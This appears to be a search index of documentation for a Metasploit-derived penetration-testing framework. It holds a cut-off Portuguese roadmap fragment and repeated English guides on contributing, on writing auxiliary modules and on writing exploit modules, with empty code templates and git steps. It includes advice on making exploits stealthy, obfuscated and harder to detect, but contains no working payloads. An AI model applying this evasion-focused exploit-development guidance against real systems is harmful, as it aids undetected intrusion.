Mudar do OpenSSL para o suporte nativo ao SChannel simplificar\u00e1 e reduzir\u00e1 o indicador do medidor do Windows, permitindo focar no que ele suporta melhor. Pesquisa de roteador e IoT * Gostar\u00edamos de continuar a pesquisa e suporte para explora\u00e7\u00e3o de dispositivos incorporados e suporte de primeira classe para ambientes com recursos limitados. Modernizando a gera\u00e7\u00e3o de carga \u00fatil * Estamos investigando a possibilidade de integra\u00e7\u00e3o com cadeias de ferramentas de terceiros para a montagem e compilacao de C, .NET, Java, dinamicamente, facilitando ao usu\u00e1rio a aquisi\u00e7\u00e3o e o uso das ferramentas, fornecendo o primeiro Suporte a v\u00e1rias arquiteturas e plataformas.","title":"O roteiro"},{"location":"dev/thg_dev/Contributing-to-thg/","text":"Like hacking things? Start here. Every so often, we'll get a request along the lines of, \"Hey, I'm new to Metasploit, and I want to help!\" The usual answer is something like, \"Great! Here's our framework bug tracker , get crackin!\" However, tackling core Metasploit Framework bugs or particularly squirrelly exploits probably isn't the right place for the new contributor. Believe me, everyone was a newbie once, there's no shame in that. Those bugs and vulns are usually complicated, and there are so many to choose from that it's hard to get started. Here are some ideas to get you started. CONTRIBUTING.md Metasploit is a tool by and for hackers, but the hackers that maintain it also happen to be software engineers. So, we have some hopefully easy-to-remember Do's and Don'ts in CONTRIBUTING.md . Read up on those. Server exploits Server exploits are always in demand; why bother with complicated social engineering campaigns when you can go straight to the pain point of a vulnerable network. Here are some search queries to get you started: Remote exploits from Exploit-DB Client Exploits Client exploits generally run as an \"evil service\" that a remote client will connect to. They nearly always require some kind of user interaction to trigger, such a viewing a web page, downloading a file, or otherwise connecting to the service controlled by the attacker. Browser Vulns from SecurityFocus via Google search terms Local and Privilege Escalation Exploits Privilege escalation exploits tend to require the attacker already have an account on a target computer. They are nearly always going to be implemented as Metasploit exploit modules under one of the local trees (platform dependent), but sometimes they're better off as post modules . This is especially true for privilege escalation bugs. Local Vulns from Exploit-DB Unstable modules Want to pick up where someone else left off? Super! Just check the guide on rescuing [[Unstable Modules]] and push these poor, unloved modules over the finish line with decent testing and code cleanup. Framework bugs and features If exploit dev isn't your thing, but more straightforward Ruby development is, then here are some good places to get started: Recent Bugs , which tend to be either very easy or very hard to fix (not a lot of middle ground). Feature requests , which is often in the same boat. Along these same lines is a perennial need for better automated testing, down in the spec directory . If you have a talent for exploring strange and wonderful code bases, pick out a chunk of the Metasploit core code and define out what you expect for working behavior. ~ This search is an ideal place to start; describe the bug as a pending Rspec test, reference the bug, and then we'll have a test that works once it gets fixed.~ Non-code We can always use better documentation. Those guys over at Offensive Security do a great job with Metasploit Unleashed , but as with all complex bodies of work, there are surely bugs to be found. If you have ideas on how to make the documentation on Metasploit clear and more accessible to more people, go nuts. Write wiki articles in your fork (hint, Gollum is excellent for this) and let someone know about them, we'll be happy to reflect them here and maintain your credit. If you're interested in working with us on documentation long-term, that's even better; reach out on Slack for info on how best to make changes. Ditto with YouTube screencasts of particular common tasks. Narration while you do it is great. People seem to love YouTube videos of this stuff -- there are over 40,000 of the things out there, and we'd love for someone to step up and curate a top 10 or top 100 of those that we can promote here for new and experienced users. For developer types: we are slowly but surely converting all of Metasploit to use standardized commenting using YARD , so we could always use more accurate and more comprehensive YARD documentation for pretty much anything found in lib . We will happily take pull requests that contain nothing but comment docs! Again, there's always room on #metasploit on Freenode. Be helpful with the questions there, and people are more likely to help you in the future. Same goes for the Metasploit Slack team , where all sorts of new and proficient users and devs are looking for help and camaraderie. The Usual Warnings You probably shouldn't run proof of concept exploit code you find on the Internet on a machine you care about in a network you care about. That is generally considered a Bad Idea. You also probably shouldn't use your usual computer as a target for exploit development, since you are intentionally inducing unstable behavior. Our preferred method of module submission is via a git pull request from a feature branch on your own fork of Metasploit. You can learn how to create one here: https://github.com/rapid7/metasploit-framework/wiki/Landing-Pull-Requests Also, please take a peek at our guides on using git and our acceptance guidelines for new modules in case you're not familiar with them: https://github.com/rapid7/metasploit-framework/wiki If you get stuck, try to explain your specific problem as best you can on our Freenode IRC channel, #metasploit (joining requires a registered nick ). Someone should be able to lend a hand. Apparently, some of those people never sleep. Thank you In case nobody's said it yet: Thanks for your interest and support! Exploit developers from the open source community are the soul of Metasploit, and by contributing your time and talent, you are helping advance the state of the art for intelligent IT defense. We simply couldn't do all of this without you.","title":"contributing_to_thg"},{"location":"dev/thg_dev/Contributing-to-thg/#like-hacking-things-start-here","text":"Every so often, we'll get a request along the lines of, \"Hey, I'm new to Metasploit, and I want to help!\" The usual answer is something like, \"Great! Here's our framework bug tracker , get crackin!\" However, tackling core Metasploit Framework bugs or particularly squirrelly exploits probably isn't the right place for the new contributor. Believe me, everyone was a newbie once, there's no shame in that. Those bugs and vulns are usually complicated, and there are so many to choose from that it's hard to get started. Here are some ideas to get you started.","title":"Like hacking things? Start here."},{"location":"dev/thg_dev/Contributing-to-thg/#contributingmd","text":"Metasploit is a tool by and for hackers, but the hackers that maintain it also happen to be software engineers. So, we have some hopefully easy-to-remember Do's and Don'ts in CONTRIBUTING.md . Read up on those.","title":"CONTRIBUTING.md"},{"location":"dev/thg_dev/Contributing-to-thg/#server-exploits","text":"Server exploits are always in demand; why bother with complicated social engineering campaigns when you can go straight to the pain point of a vulnerable network. Here are some search queries to get you started: Remote exploits from Exploit-DB","title":"Server exploits"},{"location":"dev/thg_dev/Contributing-to-thg/#client-exploits","text":"Client exploits generally run as an \"evil service\" that a remote client will connect to. They nearly always require some kind of user interaction to trigger, such a viewing a web page, downloading a file, or otherwise connecting to the service controlled by the attacker. Browser Vulns from SecurityFocus via Google search terms","title":"Client Exploits"},{"location":"dev/thg_dev/Contributing-to-thg/#local-and-privilege-escalation-exploits","text":"Privilege escalation exploits tend to require the attacker already have an account on a target computer. They are nearly always going to be implemented as Metasploit exploit modules under one of the local trees (platform dependent), but sometimes they're better off as post modules . This is especially true for privilege escalation bugs. Local Vulns from Exploit-DB","title":"Local and Privilege Escalation Exploits"},{"location":"dev/thg_dev/Contributing-to-thg/#unstable-modules","text":"Want to pick up where someone else left off? Super! Just check the guide on rescuing [[Unstable Modules]] and push these poor, unloved modules over the finish line with decent testing and code cleanup.","title":"Unstable modules"},{"location":"dev/thg_dev/Contributing-to-thg/#framework-bugs-and-features","text":"If exploit dev isn't your thing, but more straightforward Ruby development is, then here are some good places to get started: Recent Bugs , which tend to be either very easy or very hard to fix (not a lot of middle ground). Feature requests , which is often in the same boat. Along these same lines is a perennial need for better automated testing, down in the spec directory . If you have a talent for exploring strange and wonderful code bases, pick out a chunk of the Metasploit core code and define out what you expect for working behavior. ~ This search is an ideal place to start; describe the bug as a pending Rspec test, reference the bug, and then we'll have a test that works once it gets fixed.~","title":"Framework bugs and features"},{"location":"dev/thg_dev/Contributing-to-thg/#non-code","text":"We can always use better documentation. Those guys over at Offensive Security do a great job with Metasploit Unleashed , but as with all complex bodies of work, there are surely bugs to be found. If you have ideas on how to make the documentation on Metasploit clear and more accessible to more people, go nuts. Write wiki articles in your fork (hint, Gollum is excellent for this) and let someone know about them, we'll be happy to reflect them here and maintain your credit. If you're interested in working with us on documentation long-term, that's even better; reach out on Slack for info on how best to make changes. Ditto with YouTube screencasts of particular common tasks. Narration while you do it is great. People seem to love YouTube videos of this stuff -- there are over 40,000 of the things out there, and we'd love for someone to step up and curate a top 10 or top 100 of those that we can promote here for new and experienced users. For developer types: we are slowly but surely converting all of Metasploit to use standardized commenting using YARD , so we could always use more accurate and more comprehensive YARD documentation for pretty much anything found in lib . We will happily take pull requests that contain nothing but comment docs! Again, there's always room on #metasploit on Freenode. Be helpful with the questions there, and people are more likely to help you in the future. Same goes for the Metasploit Slack team , where all sorts of new and proficient users and devs are looking for help and camaraderie.","title":"Non-code"},{"location":"dev/thg_dev/Contributing-to-thg/#the-usual-warnings","text":"You probably shouldn't run proof of concept exploit code you find on the Internet on a machine you care about in a network you care about. That is generally considered a Bad Idea. You also probably shouldn't use your usual computer as a target for exploit development, since you are intentionally inducing unstable behavior. Our preferred method of module submission is via a git pull request from a feature branch on your own fork of Metasploit. You can learn how to create one here: https://github.com/rapid7/metasploit-framework/wiki/Landing-Pull-Requests Also, please take a peek at our guides on using git and our acceptance guidelines for new modules in case you're not familiar with them: https://github.com/rapid7/metasploit-framework/wiki If you get stuck, try to explain your specific problem as best you can on our Freenode IRC channel, #metasploit (joining requires a registered nick ). Someone should be able to lend a hand. Apparently, some of those people never sleep.","title":"The Usual Warnings"},{"location":"dev/thg_dev/Contributing-to-thg/#thank-you","text":"In case nobody's said it yet: Thanks for your interest and support! Exploit developers from the open source community are the soul of Metasploit, and by contributing your time and talent, you are helping advance the state of the art for intelligent IT defense. We simply couldn't do all of this without you.","title":"Thank you"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/","text":"Metasploit is known for its free, open-source exploits - modules that pop shells. But in reality, penetration testers rely more on auxiliary modules, and often a successful pentest can be done without firing a single exploit. They're just more handy, and the punishment for a failed attempt is generally much lower. Professionals actually love auxiliary modules. Another interesting fact about auxiliary modules is that some of them aren't so different from being exploits. The main difference is how it's defined in Metasploit: if a module pops a shell, it's an exploit. If not, even though it takes advantage of a vulnerability, it still belongs to the auxiliary category. So you see, if you're an auxiliary module addict, you are on the right track. Plan your module Just like writing a software, before you start coding you should have a clear and specific goal for what your auxiliary module does. It's never a good idea to have multiple functionalities in a single module. You should break it down into multiple modules instead. You should also think about how your module will perform in different situations. For example, if it's meant to test against a Tomcat server, what happens if you use it against Nginx? Will it error out and leave a backtrace? If it does, you should handle that properly. Does your module require specific settings/conditions from the target machine? What happens if it doesn't? Will it error out again? Most importantly, make sure to test your module thoroughly. It's always ugly to find out problems in the middle of an important engagement, that just might cost you. Main categories of auxiliary modules Generally speaking, auxiliary modules are categorized based on their behavior, but this is somewhat inconsistent so you'll just have to use your best judgement and find the most appropriate one. Here's a list of the common ones: Category Description admin Modules that modify, operate, or manipulate something on target machine. analyze We initially created this folder for password-cracking modules that require analysis time. client We initially created this folder for an SMTP module for social-engineering purposes. dos Pretty self-explanatory: denial-of-service modules. fuzzers If your module is a fuzzer, this is where it belongs. Make sure to place it in the correct sub-directory based on the protocol. gather Modules that gather, collect, or enumerates data from a single target. scanner Modules that use the Msf::Auxiliary::Scanner mixin almost always go here. Make sure to place yours in the correct sub-directory based on the protocol. server Modules that are servers. sniffer Modules that are sniffers. There are actually a few more directories in auxiliary, but that's kind of where the gray area is. You are more than welcome to see if yourself . The Msf::Auxiliary::Scanner mixin The Msf::Auxiliary::Scanner mixin is heavily used in auxiliary modules, so we might as well talk about it right here. The mixin allows you to be able to test against a range of hosts, and it's multi-threaded. To use it, first off you need to include the mixin under the scope of your Metasploit3 class: include Msf :: Auxiliary :: Scanner A couple of new things will be added to your module when you include this mixin. You will have a new datastore option named \"RHOSTS\", which allows the user to specify multiple hosts. There's a new \"THREADS\" option, which allows the number of threads to run during execution. There's also \"ShowProgress\" and \"ShowProgressPercent\" for tracking scan progress. Typically, the main method for an auxiliary module is \"def run\". But when you use the Msf::Auxiliary::Scanenr mixin, you need to be using def run_host(ip) . The IP parameter is the target machine. Templates Here's the most basic example of an auxiliary module. We'll explain a bit more about the fields that need to be filled: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Auxiliary def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Module name' , 'Description' => %q{ Say something that the user might want to know. } , 'Author' => [ 'Name' ] , 'License' => MSF_LICENSE )) end def run # Main function end end The Name field can begin with the vendor name, but optional. Followed by the software name. And then a few words that basically describe what it's for. For example: \"Dolibarr ERP/CRM Login Utility\" The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he's using without the need to actually read the module's source and figure things out. And trust me, most of them don't. The Author field is where you put your name. The format should be \"Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" Because the Msf::Auxiliary::Scanner mixin is so popular, we figured you want a template for it, too. And here you go: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Auxiliary include Msf :: Auxiliary :: Scanner def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Module name' , 'Description' => %q{ Say something that the user might want to know. } , 'Author' => [ 'Name' ] , 'License' => MSF_LICENSE )) end def run_host ( ip ) # Main method end end Basic git commands Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We're not here to lecture you about how awesome git is, we know it has a learning curve and it's not surprising to find new users making mistakes. Every once a while, your git \"rage\" will kick in, and we understand. However, it's important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate , which is Metasploit's utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you're submitting other crap you don't intend to change, and/or you're probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that's up to date to master. First off, make sure you're on master. If you do a git status it will tell you what branch you're currently on: $ git status # On branch upstream-master nothing to commit, working directory clean Ok, now do a git pull to download the latest changes from Metasploit: $ git pull Already up-to-date. At this point, you're ready to start a new branch. In this case, we'll name our new branch \"my_awesome_branch\": $ git checkout -b my_awesome_module Switched to a new branch 'my_awesome_module' And then you can go ahead and add that module. Make sure it's in the appropriate path: $ git add [module path] When you decide to save the changes, commit (if there's only one module, you can do git commit -a too so you don't have to type the module path. Note -a really means EVERYTHING): $ git commit [module path] When you're done, push your changes, which will upload your code to your remote branch \"my_awesome_branch\". You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch References https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary.rb https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/scanner.rb","title":"How to get started with writing an auxiliary module"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/#plan-your-module","text":"Just like writing a software, before you start coding you should have a clear and specific goal for what your auxiliary module does. It's never a good idea to have multiple functionalities in a single module. You should break it down into multiple modules instead. You should also think about how your module will perform in different situations. For example, if it's meant to test against a Tomcat server, what happens if you use it against Nginx? Will it error out and leave a backtrace? If it does, you should handle that properly. Does your module require specific settings/conditions from the target machine? What happens if it doesn't? Will it error out again? Most importantly, make sure to test your module thoroughly. It's always ugly to find out problems in the middle of an important engagement, that just might cost you.","title":"Plan your module"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/#main-categories-of-auxiliary-modules","text":"Generally speaking, auxiliary modules are categorized based on their behavior, but this is somewhat inconsistent so you'll just have to use your best judgement and find the most appropriate one. Here's a list of the common ones: Category Description admin Modules that modify, operate, or manipulate something on target machine. analyze We initially created this folder for password-cracking modules that require analysis time. client We initially created this folder for an SMTP module for social-engineering purposes. dos Pretty self-explanatory: denial-of-service modules. fuzzers If your module is a fuzzer, this is where it belongs. Make sure to place it in the correct sub-directory based on the protocol. gather Modules that gather, collect, or enumerates data from a single target. scanner Modules that use the Msf::Auxiliary::Scanner mixin almost always go here. Make sure to place yours in the correct sub-directory based on the protocol. server Modules that are servers. sniffer Modules that are sniffers. There are actually a few more directories in auxiliary, but that's kind of where the gray area is. You are more than welcome to see if yourself .","title":"Main categories of auxiliary modules"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/#the-msfauxiliaryscanner-mixin","text":"The Msf::Auxiliary::Scanner mixin is heavily used in auxiliary modules, so we might as well talk about it right here. The mixin allows you to be able to test against a range of hosts, and it's multi-threaded. To use it, first off you need to include the mixin under the scope of your Metasploit3 class: include Msf :: Auxiliary :: Scanner A couple of new things will be added to your module when you include this mixin. You will have a new datastore option named \"RHOSTS\", which allows the user to specify multiple hosts. There's a new \"THREADS\" option, which allows the number of threads to run during execution. There's also \"ShowProgress\" and \"ShowProgressPercent\" for tracking scan progress. Typically, the main method for an auxiliary module is \"def run\". But when you use the Msf::Auxiliary::Scanenr mixin, you need to be using def run_host(ip) . The IP parameter is the target machine.","title":"The Msf::Auxiliary::Scanner mixin"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/#templates","text":"Here's the most basic example of an auxiliary module. We'll explain a bit more about the fields that need to be filled: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Auxiliary def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Module name' , 'Description' => %q{ Say something that the user might want to know. } , 'Author' => [ 'Name' ] , 'License' => MSF_LICENSE )) end def run # Main function end end The Name field can begin with the vendor name, but optional. Followed by the software name. And then a few words that basically describe what it's for. For example: \"Dolibarr ERP/CRM Login Utility\" The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he's using without the need to actually read the module's source and figure things out. And trust me, most of them don't. The Author field is where you put your name. The format should be \"Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" Because the Msf::Auxiliary::Scanner mixin is so popular, we figured you want a template for it, too. And here you go: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Auxiliary include Msf :: Auxiliary :: Scanner def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Module name' , 'Description' => %q{ Say something that the user might want to know. } , 'Author' => [ 'Name' ] , 'License' => MSF_LICENSE )) end def run_host ( ip ) # Main method end end","title":"Templates"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/#basic-git-commands","text":"Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We're not here to lecture you about how awesome git is, we know it has a learning curve and it's not surprising to find new users making mistakes. Every once a while, your git \"rage\" will kick in, and we understand. However, it's important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate , which is Metasploit's utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you're submitting other crap you don't intend to change, and/or you're probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that's up to date to master. First off, make sure you're on master. If you do a git status it will tell you what branch you're currently on: $ git status # On branch upstream-master nothing to commit, working directory clean Ok, now do a git pull to download the latest changes from Metasploit: $ git pull Already up-to-date. At this point, you're ready to start a new branch. In this case, we'll name our new branch \"my_awesome_branch\": $ git checkout -b my_awesome_module Switched to a new branch 'my_awesome_module' And then you can go ahead and add that module. Make sure it's in the appropriate path: $ git add [module path] When you decide to save the changes, commit (if there's only one module, you can do git commit -a too so you don't have to type the module path. Note -a really means EVERYTHING): $ git commit [module path] When you're done, push your changes, which will upload your code to your remote branch \"my_awesome_branch\". You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch","title":"Basic git commands"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/#references","text":"https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary.rb https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/scanner.rb","title":"References"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-exploit/","text":"The real kung-fu behind exploit development isn't actually about which language you choose to build it, it's about your precise understanding of how an input is processed by the application you're debugging, and how to gain control by manipulating it. That's right, the keyword is \"debugging.\" Your binjitsu (reverse-engineering) is where the real kung-fu is. However, if your goal isn't just about popping a calculator, but actually want to weaponize, to maintain, and to provide use in the practical world, you need a development framework. And this is where Metasploit comes in. It's a framework that's free and open-source, actively contributed by researchers around the world. So when you write a Metasploit exploit, you don't have to worry about any dependency issues , or having the wrong version, or not having enough payloads for different pentesting scenarios to choose from, etc. The idea is all you need to do is focus on building that exploit, and nothing more. Plan your module Unlike writing a proof-of-concept, when you write a Metasploit module you need to think about how users might use it in the real world. Stealth is usually an important element to think about. Can your exploit achieve code execution without dropping a file? Can the input look more random so it's more difficult to detect? How about obfuscation? Is it generating unnecessary traffic? Can it be more stable without crashing the system so much, etc, etc. Also, try to be precise about exploitable requirements. Usually, a bug is specific to a range of versions, or even builds. If you can't automatically check that, you need to at least mention it in the description somewhere. Some of your exploit's techniques might also be application-specific. For example, you can take advantage of a specific behavior in the application to generate heap allocations the way you want, but maybe it's more noisy in the newer version so that gives you some stability issues. Does it need a 3 rd -party component to work that may not even be installed by everyone? Even if it is, is the component revised often that could make your exploit less reliable? Know that in the real world, your exploit can break or fail in a lot of different ways. You should try to find out and fix it during the development and testing phase before learning the hard way. Ranking As you can see, reliability is important to Metasploit, and we try to be more friendly about this for the users. I know what you're thinking: \"Well, if they're using the exploit they should understand how it works, so they know what they're getting themselves into.\" In the perfect world, yes. Knowing how a vulnerability works or how an exploit works will only benefit the user, but you see, we don't live in the perfect world. If you're in the middle of a penetration test, it's very unlikely to always find the time to recreate the vulnerable environment, strip the exploit to the most basic form to debug what's going on, and then do testing. Chances are you have a tight schedule to break into a large network, so you need to use your time carefully. Because of this, it's important to at least have a good description and good references for the module. And of course, a ranking system that can be trusted. The Metasploit Framework has seven different rankings to indicate how reliable an exploit is. See [[Exploit Ranking]] for more details. Template If you have read this far, we think you are pretty impressive because it's a lot to digest. You are probably wondering why we haven't had a single line of code to share in the write-up. Well, as you recall, exploit development is mostly about your reversing skills. If you have all that, we shouldn't be telling you how to write an exploit. What we've done so far is hopefully get your mindset dialed-in correctly about what it means to become a Metasploit exploit developer for the security community, the rest is more about how to use our mixins to build that exploit. Well, there are A LOT of mixins so it's impossible to go over all of them in a single page, so you must either read the API documentation , existing code examples , or look for more wiki pages we've written to cover specific mixins. For example, if you're looking for a writeup about how to interact with an HTTP server, you might be interested in: How to send an HTTP Request Using HTTPClient . If you're interested in browser exploit writing, definitely check out: How to write a browser exploit using BrowserExploitServer , etc. But of course, to begin you most likely need a template to work with, and here it is. We'll also explain how to fill out the required fields: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking def initialize ( info = {}) super ( update_info ( info , 'Name' => \"[Vendor] [Software] [Root Cause] [Vulnerability type]\" , 'Description' => %q{ Say something that the user might need to know } , 'License' => MSF_LICENSE , 'Author' => [ 'Name' ] , 'References' => [ [ 'URL' , '' ] ] , 'Platform' => 'win' , 'Targets' => [ [ 'System or software version' , { 'Ret' => 0x41414141 # This will be available in `target.ret` } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'Privileged' => false , 'DisclosureDate' => \"\" , 'DefaultTarget' => 0 )) end def check # For the check command end def exploit # Main function end end The Name field should begin with the name of the vendor, followed by the software. Ideally the \"Root Cause\" field means which component or function the bug is found. And finally, the type of vulnerability the module is exploiting. The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he's using without the need to actually read the module's source and figure things out. And trust me, most of them don't. The Author field is where you put your name. The format should be \"Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" The References field is an array of references related to the vulnerability or the exploit. For example: an advisory, a blog post, etc. Make sure you use known reference identifiers -- see [[Metasploit module reference identifiers]] for a list. The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. The Targets field is an array of systems, applications, setups, or specific versions your exploit is targeting. The second element or each target array is where you store specific metadata about that target, for example: a specific offset, a gadget, a ret address, etc. When a target is selected by the user, the metadata is loaded and tracked by a \"target index\", and can be retrieved by using the target method. The Payloads field specifies how the payload should be encoded and generated. You can specify: Space , SaveRegisters , Prepend , PrependEncoder , BadChars , Append , AppendEncoder , MaxNops , MinNops , Encoder , Nop , EncoderType , EncoderOptions , ExtendedOptions , EncoderDontFallThrough . The DisclosureDate is about when the vulnerability was disclosed in public, in the format of: \"M D Y\". For example: \"Apr 04 2014\" Your exploit should also have a check method to support the check command, but this is optional in case it's not possible. And finally, the exploit method is like your main method. Start writing your code there. Basic git commands Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We're not here to lecture you about how awesome git is, we know it has a learning curve and it's not surprising to find new users making mistakes. Every once a while, your git \"rage\" will kick in, and we understand. However, it's important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate , which is Metasploit's utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you're submitting other crap you don't intend to change, and/or you're probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that's up to date to master. First off, make sure you're on master. If you do a git status it will tell you what branch you're currently on: $ git status # On branch upstream-master nothing to commit, working directory clean Ok, now do a git pull to download the latest changes from Metasploit: $ git pull Already up-to-date. At this point, you're ready to start a new branch. In this case, we'll name our new branch \"my_awesome_branch\": $ git checkout -b my_awesome_branch Switched to a new branch 'my_awesome_branch' And then you can go ahead and add that module. Make sure it's in the appropriate path: $ git add [module path] When you decide to save the changes, commit (if there's only one module, you can do git commit -a too so you don't have to type the module path. Note -a really means EVERYTHING): $ git commit [module path] When you're done, push your changes, which will upload your code to your remote branch \"my_awesome_branch\". You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch References https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit.rb","title":"How_to_get_started_with_writing_an_exploit"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-exploit/#plan-your-module","text":"Unlike writing a proof-of-concept, when you write a Metasploit module you need to think about how users might use it in the real world. Stealth is usually an important element to think about. Can your exploit achieve code execution without dropping a file? Can the input look more random so it's more difficult to detect? How about obfuscation? Is it generating unnecessary traffic? Can it be more stable without crashing the system so much, etc, etc. Also, try to be precise about exploitable requirements. Usually, a bug is specific to a range of versions, or even builds. If you can't automatically check that, you need to at least mention it in the description somewhere. Some of your exploit's techniques might also be application-specific. For example, you can take advantage of a specific behavior in the application to generate heap allocations the way you want, but maybe it's more noisy in the newer version so that gives you some stability issues. Does it need a 3 rd -party component to work that may not even be installed by everyone? Even if it is, is the component revised often that could make your exploit less reliable? Know that in the real world, your exploit can break or fail in a lot of different ways. You should try to find out and fix it during the development and testing phase before learning the hard way.","title":"Plan your module"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-exploit/#ranking","text":"As you can see, reliability is important to Metasploit, and we try to be more friendly about this for the users. I know what you're thinking: \"Well, if they're using the exploit they should understand how it works, so they know what they're getting themselves into.\" In the perfect world, yes. Knowing how a vulnerability works or how an exploit works will only benefit the user, but you see, we don't live in the perfect world. If you're in the middle of a penetration test, it's very unlikely to always find the time to recreate the vulnerable environment, strip the exploit to the most basic form to debug what's going on, and then do testing. Chances are you have a tight schedule to break into a large network, so you need to use your time carefully. Because of this, it's important to at least have a good description and good references for the module. And of course, a ranking system that can be trusted. The Metasploit Framework has seven different rankings to indicate how reliable an exploit is. See [[Exploit Ranking]] for more details.","title":"Ranking"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-exploit/#template","text":"If you have read this far, we think you are pretty impressive because it's a lot to digest. You are probably wondering why we haven't had a single line of code to share in the write-up. Well, as you recall, exploit development is mostly about your reversing skills. If you have all that, we shouldn't be telling you how to write an exploit. What we've done so far is hopefully get your mindset dialed-in correctly about what it means to become a Metasploit exploit developer for the security community, the rest is more about how to use our mixins to build that exploit. Well, there are A LOT of mixins so it's impossible to go over all of them in a single page, so you must either read the API documentation , existing code examples , or look for more wiki pages we've written to cover specific mixins. For example, if you're looking for a writeup about how to interact with an HTTP server, you might be interested in: How to send an HTTP Request Using HTTPClient . If you're interested in browser exploit writing, definitely check out: How to write a browser exploit using BrowserExploitServer , etc. But of course, to begin you most likely need a template to work with, and here it is. We'll also explain how to fill out the required fields: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking def initialize ( info = {}) super ( update_info ( info , 'Name' => \"[Vendor] [Software] [Root Cause] [Vulnerability type]\" , 'Description' => %q{ Say something that the user might need to know } , 'License' => MSF_LICENSE , 'Author' => [ 'Name' ] , 'References' => [ [ 'URL' , '' ] ] , 'Platform' => 'win' , 'Targets' => [ [ 'System or software version' , { 'Ret' => 0x41414141 # This will be available in `target.ret` } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'Privileged' => false , 'DisclosureDate' => \"\" , 'DefaultTarget' => 0 )) end def check # For the check command end def exploit # Main function end end The Name field should begin with the name of the vendor, followed by the software. Ideally the \"Root Cause\" field means which component or function the bug is found. And finally, the type of vulnerability the module is exploiting. The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he's using without the need to actually read the module's source and figure things out. And trust me, most of them don't. The Author field is where you put your name. The format should be \"Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" The References field is an array of references related to the vulnerability or the exploit. For example: an advisory, a blog post, etc. Make sure you use known reference identifiers -- see [[Metasploit module reference identifiers]] for a list. The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. The Targets field is an array of systems, applications, setups, or specific versions your exploit is targeting. The second element or each target array is where you store specific metadata about that target, for example: a specific offset, a gadget, a ret address, etc. When a target is selected by the user, the metadata is loaded and tracked by a \"target index\", and can be retrieved by using the target method. 